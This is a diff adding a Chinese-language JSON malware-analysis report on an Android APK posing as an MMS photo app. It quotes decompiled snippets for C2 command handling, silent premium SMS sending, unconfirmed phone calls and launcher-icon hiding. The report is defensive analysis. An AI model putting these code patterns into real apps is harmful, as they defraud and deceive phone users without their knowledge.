@@ -1,0 +1,148 @@
+{
+  "APK信息": {
+    "文件名": "c9bfea7a58aa8a3b60198832d891622da61d48ace0d97d42aa5616c76382b828.apk",
+    "sha256": "c9bfea7a58aa8a3b60198832d891622da61d48ace0d97d42aa5616c76382b828",
+    "包名": "org.thesis.particular",
+    "应用名": "ММS - Фото",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 159.1
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thesis\\particular\\Dozen;",
+          "method_signature": "a(Context context, String str, String str2, String str3, int i)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"status\");\nintent.putExtra(\"id\", str3);\nintent.putExtra(\"command\", i);\nb.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\nString stringExtra = intent.getStringExtra(\"body\");\nint intExtra = intent.getIntExtra(\"type\", 0);\nint intExtra2 = intent.getIntExtra(\"waitrun\", 0);",
+          "malicious_code_snippet_context": "      }\n  \n      private static void a(Context context, String str, String str2, String str3, int i) {\n>>>         Intent intent = new Intent(\"status\");\n>>>         intent.putExtra(\"id\", str3);\n>>>         intent.putExtra(\"command\", i);\n>>>         b.a(str, str2, PendingIntent.getBroadcast(context, 0, intent, 134217728));\n>>>     }\n>>> \n>>>     private void a(Intent intent) {\n          int i;\n          boolean z = false;\n          String stringExtra = intent.getStringExtra(\"body\");",
+          "behavior_description": "该代码实现了C2命令分发与接收机制。发送端通过构造带\"status\" action的Intent，携带\"id\"和\"command\"参数，封装为PendingIntent.getBroadcast后传递给b.a()方法进行发送；接收端从Intent中提取\"body\"(命令内容)、\"type\"(命令类型)、\"waitrun\"(延迟执行标志)等字段，构成完整的C2指令接收与执行通道。\"waitrun\"参数表明支持延迟执行命令，是典型的远程控制木马行为模式。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thesis\\particular\\b;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "  \n      public static void a(String str, String str2, PendingIntent pendingIntent) {\n          try {\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "该方法通过 SmsManager.getDefault().sendTextMessage() 静默发送短信，目标号码(str)和短信内容(str2)均由外部参数传入，无需用户交互即可发送。在已确认的恶意样本中，此行为通常用于向付费号码发送短信，实施短信欺诈，直接造成用户经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thesis\\particular\\Dozen;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "  \n      private static int b(Context context, String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
+          "behavior_description": "代码使用 ACTION_CALL 直接发起电话呼叫，无需用户确认即可拨打由参数 str 指定的号码。在恶意样本中，该号码通常为高额扣费号码或特定服务号码，导致用户在不知情的情况下被扣除高额话费，造成直接经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\thesis\\particular\\b;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, Entry.class), 2, 1);",
+          "malicious_code_snippet_context": "      }\n  \n      public static void e(Context context) {\n>>>         context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) Entry.class), 2, 1);\n      }\n  \n      public static ArrayList<String[]> f(Context context) {",
+          "behavior_description": "通过调用 PackageManager.setComponentEnabledSetting 将应用入口组件 Entry 设置为禁用状态（参数2对应DISABLED），导致应用图标从桌面启动器中隐藏，从而在后台隐蔽运行。数据流向：无数据源 -> setComponentEnabledSetting(禁用入口组件)",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
